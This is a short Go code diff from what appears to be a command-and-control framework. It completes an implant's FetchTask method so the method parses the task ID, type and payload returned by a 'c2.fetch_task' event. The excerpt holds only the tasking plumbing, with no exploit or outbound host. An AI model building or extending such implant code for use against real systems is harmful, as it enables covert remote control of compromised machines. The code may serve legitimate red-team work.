@@ -217,12 +217,28 @@ func (i *Implant) FetchTask() (*types.Task, error) {
 		"agent_id": agentID,
 	}
 
-	_, err := i.eventBus.Publish("c2.fetch_task", agentID, "fetch", data)
+	result, err := i.eventBus.Publish("c2.fetch_task", agentID, "fetch", data)
 	if err != nil {
 		return nil, fmt.Errorf("publish fetch_task event: %w", err)
 	}
 
-	return nil, nil
+	if result == nil || result.Data == nil {
+		return nil, nil
+	}
+
+	taskID, _ := result.Data["task_id"].(string)
+	taskType, _ := result.Data["type"].(string)
+	payload, _ := result.Data["payload"].(string)
+
+	if taskID == "" {
+		return nil, nil
+	}
+
+	return &types.Task{
+		ID:      taskID,
+		Type:    types.TaskType(taskType),
+		Payload: []byte(payload),
+	}, nil
 }
 
 func (i *Implant) ExecuteTask(task *types.Task) (*types.TaskResult, error) {
